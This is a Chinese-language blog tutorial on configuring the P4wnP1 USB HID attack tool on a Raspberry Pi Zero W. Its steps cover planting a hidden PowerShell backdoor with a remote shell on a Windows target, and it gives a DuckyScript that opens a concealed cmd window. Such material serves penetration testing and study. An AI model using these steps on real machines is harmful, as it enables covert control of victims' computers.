<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="true" > 
<link href="/project/fontawesome/css/fontawesome.css" rel="stylesheet">
<link href="/project/fontawesome/css/brands.css" rel="stylesheet">
<link href="/project/fontawesome/css/solid.css" rel="stylesheet">
<script src="/project/js/color.global.min.js" ></script>
<script src="/project/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
  
  <title>P4wnP1配置与使用 | Edvison&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="P4wnP1为一款基于树莓派Zero W的USB HID设备模拟工具。">
<meta property="og:type" content="article">
<meta property="og:title" content="P4wnP1配置与使用">
<meta property="og:url" content="https://edvison.github.io/project/2023/08/09/P4wnP1%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BD%BF%E7%94%A8/index.html">
<meta property="og:site_name" content="Edvison&#39;s blog">
<meta property="og:description" content="P4wnP1为一款基于树莓派Zero W的USB HID设备模拟工具。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809161116987.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919152708762.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153640632.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919152904417.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919152914987.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919152935814.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919152946829.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919152954908.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153002601.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153010233.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153032769.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153047744.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153102570.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153110959.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153121392.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153129621.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153138346.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153145023.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153159036.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153220669.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/setkeyboard.PNG">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/send.PNG">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/powershell.PNG">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/shell.PNG">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153359902.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153411527.png">
<meta property="article:published_time" content="2023-08-09T08:06:58.000Z">
<meta property="article:modified_time" content="2023-08-09T08:12:12.860Z">
<meta property="article:author" content="edvison">
<meta property="article:tag" content="HID攻击">
<meta property="article:tag" content="树莓派">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809161116987.png">
  
    <link rel="alternate" href="/project/atom.xml" title="Edvison's blog" type="application/atom+xml">
  
  
    <link rel="icon" media="(prefers-color-scheme: light)" href="/project/images/favicon-light-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/project/images/favicon-light-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/project/images/favicon-light-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/project/images/favicon-light-192.png" sizes="192x192">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/project/images/favicon-dark-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/project/images/favicon-dark-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/project/images/favicon-dark-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/project/images/favicon-dark-192.png" sizes="192x192">
  
  
<link rel="stylesheet" href="/project/css/style.css">

<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/20230807175151.png" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="shadow   ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/project/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>Edvison's blog </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/project/">Home</a>
    
      <a class="main-nav-link" href="/project/archives">Archives</a>
    
      <a class="main-nav-link" href="/project/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="material-symbols-rounded light-mode-icon">wb_sunny</span>
      <span class="material-symbols-rounded dark-mode-icon">dark_mode</span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/project/atom.xml" title="RSS 订阅">
        <span class="material-symbols-rounded rss">rss_feed</span>
      </a>
    
    <a id="nav-search-btn" class="nav-icon" title="搜索" style="display: none;">
      <span class="material-symbols-rounded">search</span>
    </a>
    <div id="nav-menu-btn" class="nav-icon">
      <span class="material-symbols-rounded">menu</span>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/project/">Home</a>
    
      <a class="nav-dropdown-link" href="/project/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/project/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/project/atom.xml" title="RSS 订阅">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/20230808155156.png></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Edvison </div>
      <div class="dot"></div>
      <div class="subtitle">flung out of space </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/Edvison" title="github"><i class="fa-brands fa-github"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://weibo.com/u/6038772011" title="weibo"><i class="fa-brands fa-weibo"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">分类</h3>
      <div class="category-box">
            <a class="category-link" href="/project/categories/UEFI%E5%8E%9F%E7%90%86/">
                UEFI原理
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/project/categories/UEFI%E5%9B%BA%E4%BB%B6%E5%AE%89%E5%85%A8/">
                UEFI固件安全
                <div class="category-count">6</div>
            </a>
        
            <a class="category-link" href="/project/categories/MBR%E5%8E%9F%E7%90%86/">
                MBR原理
                <div class="category-count">2</div>
            </a>
        
            <a class="category-link" href="/project/categories/%E7%BF%BB%E8%AF%91/">
                翻译
                <div class="category-count">4</div>
            </a>
        
            <a class="category-link" href="/project/categories/Grub2%E5%8E%9F%E7%90%86/">
                Grub2原理
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/project/categories/IoT%E5%AE%89%E5%85%A8/">
                IoT安全
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/project/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/">
                硬件安全
                <div class="category-count">4</div>
            </a>
        
            <a class="category-link" href="/project/categories/VBIOS%E4%BF%AE%E6%94%B9/">
                VBIOS修改
                <div class="category-count">1</div>
            </a>
        </div>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">标签</h3>
      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/CSM/" rel="tag">CSM</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/DMA%E6%94%BB%E5%87%BB/" rel="tag">DMA攻击</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/Grub2/" rel="tag">Grub2</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/HID%E6%94%BB%E5%87%BB/" rel="tag">HID攻击</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/MBR/" rel="tag">MBR</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/MBR%E5%90%8E%E9%97%A8/" rel="tag">MBR后门</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/OS-Loader/" rel="tag">OS Loader</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/OVMF%E7%BC%96%E8%AF%91/" rel="tag">OVMF编译</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/PCH/" rel="tag">PCH</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/SMM/" rel="tag">SMM</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/SMM%E5%90%8E%E9%97%A8/" rel="tag">SMM后门</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/SMM%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">SMM漏洞分析</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/UEFI/" rel="tag">UEFI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/VBIOS/" rel="tag">VBIOS</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/pcie/" rel="tag">pcie</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%86%99%E4%BF%9D%E6%8A%A4/" rel="tag">写保护</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%86%99%E4%BF%9D%E6%8A%A4%E7%AA%81%E7%A0%B4/" rel="tag">写保护突破</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%8E%9F%E7%90%86/" rel="tag">原理</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%AE%89%E5%85%A8%E5%90%AF%E5%8A%A8/" rel="tag">安全启动</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%BC%80%E5%8F%91%E6%9D%BF/" rel="tag">开发板</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/" rel="tag">树莓派</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="tag">漏洞利用</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" rel="tag">漏洞扫描</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" rel="tag">环境搭建</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E7%94%B5%E6%BA%90%E6%95%85%E9%9A%9C/" rel="tag">电源故障</a></li></ul>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">归档</h3>
      
      
        <a class="archive-link" href="/project/archives/2023/08 ">
          八月 2023 
          <div class="archive-count">22 </div>
        </a>
      
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">最新文章</h3>
      <ul>
        
          <a class="recent-link" href="/project/2023/08/09/Lenovo%E5%9B%BA%E4%BB%B6%E4%B8%AD%E7%9A%84SMM-callout%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="Lenovo固件中的SMM callout漏洞利用" >
            <div class="recent-link-text">
              Lenovo固件中的SMM callout漏洞利用
            </div>
          </a>
        
          <a class="recent-link" href="/project/2023/08/09/%E5%88%A9%E7%94%A8DMA%E6%94%BB%E5%87%BB%E7%AA%81%E7%A0%B4UEFI%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/" title="利用DMA攻击突破UEFI安全机制" >
            <div class="recent-link-text">
              利用DMA攻击突破UEFI安全机制
            </div>
          </a>
        
          <a class="recent-link" href="/project/2023/08/09/UEFI-%E5%BC%95%E5%AF%BC%E8%84%9A%E6%9C%AC%E8%A1%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="UEFI 引导脚本表漏洞利用" >
            <div class="recent-link-text">
              UEFI 引导脚本表漏洞利用
            </div>
          </a>
        
          <a class="recent-link" href="/project/2023/08/09/%E5%9F%BA%E4%BA%8EUEFI%E5%B9%B3%E5%8F%B0%E7%9A%84SMM%E5%90%8E%E9%97%A8%E6%9E%84%E5%BB%BA/" title="基于UEFI平台的SMM后门构建" >
            <div class="recent-link-text">
              基于UEFI平台的SMM后门构建
            </div>
          </a>
        
          <a class="recent-link" href="/project/2023/08/09/P4wnP1%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BD%BF%E7%94%A8/" title="P4wnP1配置与使用" >
            <div class="recent-link-text">
              P4wnP1配置与使用
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       

<article id="post-P4wnP1配置与使用" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        P4wnP1配置与使用
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2023-08-09T08:06:58.000Z" itemprop="datePublished">2023-08-09</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/project/categories/IoT%E5%AE%89%E5%85%A8/">IoT安全</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            2k 词 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/HID%E6%94%BB%E5%87%BB/" rel="tag">HID攻击</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/" rel="tag">树莓派</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <p>P4wnP1为一款基于树莓派Zero W的USB HID设备模拟工具。</p>
<span id="more"></span>

<h1 id="HID攻击"><a href="#HID攻击" class="headerlink" title="HID攻击"></a>HID攻击</h1><p>USB HID攻击技术是一种利用USB接口伪造用户击键行为的攻击方式，通过恶意USB HID设备连接到主机后发送伪造的按键命令，篡改系统设置、运行恶意功能。</p>
<p>在树莓派Raspberry Pi Zero W设备上，借助Raspberry Pi Zero W小巧但功能丰富的特点，可构建一个高度可定制的攻击平台。其功能如下：</p>
<ul>
<li><p>内置小型操作系统，在模拟成USB HID设备的同时，还能利用WiFi&#x2F;蓝牙连接到互联网，通过HID隐蔽通道与攻击者通信。</p>
</li>
<li><p>内置多个脚本，可自定义，可按需进行触发，模拟键鼠的按键行为。</p>
</li>
<li><p>支持交互式登录，登录方式包括SSH、串口、HDMI显示。</p>
</li>
<li><p>结合系统漏洞，实施漏洞利用，破解系统密码。</p>
</li>
</ul>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809161116987.png" alt="image-20230809161116987"></p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/mame82/P4wnP1">https://github.com/mame82/P4wnP1</a></p>
<h1 id="raspberry-pi-zero-w接口"><a href="#raspberry-pi-zero-w接口" class="headerlink" title="raspberry pi zero w接口"></a>raspberry pi zero w接口</h1><p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919152708762.png" alt="image-20220919152708762"></p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153640632.png" alt="image-20220919153640632"></p>
<h1 id="初始配置"><a href="#初始配置" class="headerlink" title="初始配置"></a>初始配置</h1><h2 id="SD卡烧录"><a href="#SD卡烧录" class="headerlink" title="SD卡烧录"></a>SD卡烧录</h2><p>官网下载安装镜像烧录工具：<a target="_blank" rel="noopener" href="https://www.raspberrypi.com/software/">https://www.raspberrypi.com/software/</a></p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919152904417.png" alt="image-20220919152904417"></p>
<p>下载raspbian stretch镜像：<a target="_blank" rel="noopener" href="https://downloads.raspberrypi.org/raspbian/images/raspbian-2019-04-09/">https://downloads.raspberrypi.org/raspbian/images/raspbian-2019-04-09/</a></p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919152914987.png" alt="image-20220919152914987"></p>
<p>SD卡插入读卡器，打开烧录器，选择”使用自定义镜像”：<code>2019-04-08-raspbian-stretch.img</code>，和对应的SD卡，点击烧录即可。</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919152935814.png" alt="image-20220919152935814"></p>
<h2 id="启动配置"><a href="#启动配置" class="headerlink" title="启动配置"></a>启动配置</h2><p>烧录完成后，SD卡插回树莓派，连接好hdmi接口、键鼠和电源，开机进入设置界面。</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919152946829.png" alt="image-20220919152946829"></p>
<p>设置地区和语言：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919152954908.png" alt="image-20220919152954908"></p>
<p>设置用户密码，默认用户为pi：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153002601.png" alt="image-20220919153002601"></p>
<p>连接无线网络，选择当前能连接到的wifi：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153010233.png" alt="image-20220919153010233"></p>
<p>另外，网络配置也可以在SD卡的文件中写入默认配置：</p>
<ol>
<li>在sd卡的boot分区根目录下新建一个名为ssh的空文件</li>
<li>在sd卡的rootfs分区根目录etc&#x2F;network目录下的interfaces文件添加下面内容：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">iface eth0 inet manual</span><br><span class="line">auto wlan0</span><br><span class="line">allow-hotplug wlan0</span><br><span class="line">iface wlan0 inet dhcp</span><br><span class="line">    wpa-ssid &quot;WIFI_NAME&quot;</span><br><span class="line">    wpa-key &quot;WIFI_PASSWD&quot;</span><br><span class="line">    wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf</span><br></pre></td></tr></table></figure>

<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153032769.png" alt="image-20220919153032769"></p>
<ol start="3">
<li>修改 &#x2F;etc&#x2F;wpa_supplicant&#x2F;wpa_supplicant.conf 文件</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">country=GB</span><br><span class="line">ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev</span><br><span class="line">update_config=1</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">network=&#123;</span><br><span class="line">    ssid=&quot;WIFI_NAME&quot;</span><br><span class="line">    psk=&quot;WIFI_PASSWD&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153047744.png" alt="image-20220919153047744"></p>
<p>修改&#x2F;etc&#x2F;rc.local文件设置开机启动ssh服务，在exit 0前添加命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su pi -c &quot;/etc/init.d/ssh start&quot;</span><br></pre></td></tr></table></figure>

<p>连接到网络后，根据系统提示进行系统更新：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153102570.png" alt="image-20220919153102570"></p>
<p>更新完后重启树莓派，配置完成。</p>
<p>可以用ssh连接到树莓派了：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153110959.png" alt="image-20220919153110959"></p>
<h1 id="P4wnP1"><a href="#P4wnP1" class="headerlink" title="P4wnP1"></a>P4wnP1</h1><h2 id="配置安装"><a href="#配置安装" class="headerlink" title="配置安装"></a>配置安装</h2><p>下载安装P4wnP1：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone --recursive   https://github.com/mame82/P4wnP1</span><br><span class="line">cd P4wnP1</span><br><span class="line">./install.sh</span><br></pre></td></tr></table></figure>

<p>安装时会弹出配置窗口，配置以非root用户抓包：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153121392.png" alt="image-20220919153121392"></p>
<p>如出现错误：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153129621.png" alt="image-20220919153129621"></p>
<p>可以不用管，这条命令只在jessie系统下面需要：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153138346.png" alt="image-20220919153138346"></p>
<p>安装完成：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153145023.png" alt="image-20220919153145023"></p>
<p>装好后配置.&#x2F;P4wnP1&#x2F;Setup.cfg文件，选择目标机的输入法语言（也可以进P4wnP1 shell再设置），选择需要的payload。</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153159036.png" alt="image-20220919153159036"></p>
<p>重启raspberry就能连接上P4wnP1的wifi了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Network name: P4wnP1</span><br><span class="line">Key: MaMe82-P4wnP1</span><br></pre></td></tr></table></figure>

<p>连接上wifi后使用ssh登录shell，用户密码是刚才自行配置的密码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pi@172.24.0.1</span><br></pre></td></tr></table></figure>

<h2 id="hid-backdoor后门负载"><a href="#hid-backdoor后门负载" class="headerlink" title="hid_backdoor后门负载"></a>hid_backdoor后门负载</h2><p>HID后门攻击方式：</p>
<ol>
<li>选择hid_backdoor.txt载荷</li>
<li>将树莓派连接到Windows目标</li>
<li>攻击机连接到P4wnP1生成的WiFi，ssh登录控制端</li>
<li>进入P4wnP1 shell，输入<code>SetKeyboardLayout</code>命令，设置目标键盘布局</li>
<li>P4wnP1 shell上运行<code>SendKeys</code>或<code>FireDuckyScript</code>注入键盘输入</li>
<li>运行命令<code>FireStage1</code>，建立隐蔽通道的HID后门</li>
<li>目标回连成功后，输入<code>shell</code>命令，进入隐蔽通道创建的远程shell</li>
</ol>
<p>下面详细看下操作步骤：<br>选择hid_backdoor.txt的payload，连接上ssh后就可以进入P4wnP1的shell界面：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20220919153220669.png" alt="image-20220919153220669"></p>
<p>输入help可以看到P4wnP1 shell能用的命令，下面是几个基本命令的说明：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">FireStage1 #启动powershell，并快速隐藏powershell界面然后开启一个木马在目标机和raspberry间建立一个双工连接</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">shell #连接上之后可以打开目标机的cmd</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">GetKeyboardLanguage #显示当前的键盘语言</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">SetKeyboardLanguage #根据目标的语言设置当前键盘语言</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">SendKeys #发送字符串输入到目标</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">SendDuckyScript #发送一个橡皮鸭脚本</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">SendMouseScript #发送一个鼠标脚本</span><br></pre></td></tr></table></figure>


<p>进入P4wnP1 shell，输入<code>SetKeyboardLanguage</code>命令，设置目标键盘布局，测试目标是us键盘布局，选择15:</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/setkeyboard.PNG" alt="setkeyboard"></p>
<p>运行<code>SendKeys</code>可以向目标发送指定的字符串，但仅限字符串，无法发送控制键。想要发送控制键就需要使用<code>FireDuckyScript</code>命令，向目标发送一个橡皮鸭脚本，如下例，发送一个Alt+F4的控制键：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/send.PNG" alt="send"></p>
<h3 id="DuckyScript脚本"><a href="#DuckyScript脚本" class="headerlink" title="DuckyScript脚本"></a>DuckyScript脚本</h3><p>下面是橡皮鸭脚本的基本命令说明：<a target="_blank" rel="noopener" href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript">https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript</a><br>使用 <code>FireDuckyScript</code> 需要在setup.cfg中设置USE_HID为true<br>将写好的脚本放到.&#x2F;P4wnP1&#x2F;DuckyScripts目录下，就能在 <code>FireDuckyScript</code> 命令中调用它们了。</p>
<p>下面是几个简单的橡皮鸭脚本例子：</p>
<ol>
<li>打开cmd窗口并快速隐藏到边框下：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">GUI r</span><br><span class="line">DELAY 100</span><br><span class="line">ALT SPACE</span><br><span class="line">STRING M</span><br><span class="line">RIGHTARROW</span><br><span class="line">REPEAT 500</span><br><span class="line">DELAY 200</span><br><span class="line">STRING cmd /Q /D /T:7F /F:OFF /V:ON /K</span><br><span class="line">DELAY 250</span><br><span class="line">ENTER</span><br><span class="line">DELAY 100</span><br><span class="line">ALT SPACE</span><br><span class="line">STRING M</span><br><span class="line">DOWNARROW</span><br><span class="line">REPEAT 1000</span><br><span class="line">DELAY 50</span><br><span class="line">ALT SPACE</span><br><span class="line">STRING M</span><br><span class="line">RIGHTARROW</span><br><span class="line">REPEAT 1000</span><br><span class="line">ENTER</span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure>


<ol start="2">
<li>切换输入法：</li>
</ol>
